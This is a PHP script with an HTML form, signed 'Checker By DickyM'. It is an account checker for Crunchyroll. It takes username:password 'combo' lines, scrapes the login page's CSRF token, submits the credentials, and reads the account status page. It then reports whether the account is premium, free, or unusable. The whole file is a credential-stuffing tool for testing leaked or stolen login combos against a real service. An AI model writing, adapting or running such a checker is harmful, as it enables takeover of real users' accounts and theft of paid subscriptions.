<?php
    $url = "https://www.crunchyroll.com/es-es/login";
    $urlDos = "https://www.crunchyroll.com/acct/?action=status";
    $urlLogout = "https://www.crunchyroll.com/logout";

    $cookie = "hola.txt";

    $headers = array();
    $headers[] = "Origin: https://www.crunchyroll.com/es-es/login";
    $headers[] = "Accept-Language: es-ES,it;q=0.8,en-US;q=0.6,en;q=0.4";
    $headers[] = "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36";
    $headers[] = "Referer: https://www.crunchyroll.com/es-es/login";
    $headers[] = "Connection: keep-alive";

    if(isset($_POST['combo'])){

        $combo = explode(":", $_POST['combo']);

        $username = $combo[0];
        $password = $combo[1];

        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0');
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie);
        curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie);
        
        $resultado = curl_exec($ch);

        $ubicacion = strpos($resultado, 'name="login_form[_token]" value="');
        $token = substr($resultado, $ubicacion+33, 43);

        $post = "login_form[name]=$username&login_form[password]=$password&login_form[_token]=$token&login_form[redirect_url]=";

        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0');
        curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie);
        curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie);

        $resultadoDos = curl_exec($ch);

        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $urlDos);
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0');
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie);
        curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie);

        $resultadoTres = curl_exec($ch);

        echo $resultadoTres;

        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $urlLogout);
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0');
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie);
        curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie);

        $resultadoCuatro = curl_exec($ch);

        if(strpos($resultadoTres, '<a href="http://www.crunchyroll.com/es-es/freetrial?from=memberstar" token="memberstar">')){
            $resultadoTipo = "Cuenta Premium";
        }else if(strpos($resultadoTres, "Gratis")){
            $resultadoTipo = "Cuenta Free";
        }else{
            $resultadoTipo = "No sirve";
        }

        curl_close ($ch);

    }
?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>DickyM</title>
</head>
<body>
    <form method="post">
        <textarea name="combo" id="" style="width:100%;" rows="10"></textarea>
        <center>
            <button type="submit">Checar Cuenta</button>
        </center>
    </form>
    <br><br><br>
    <hr>
    <br><br><br>
    <center>
    <?php 
        if(isset($_POST['combo'])){
            echo "<h1>".$resultadoTipo."</h1>";
        }
    ?>
        <h2>Checker By DickyM</h2>
    </center>
</body>
</html>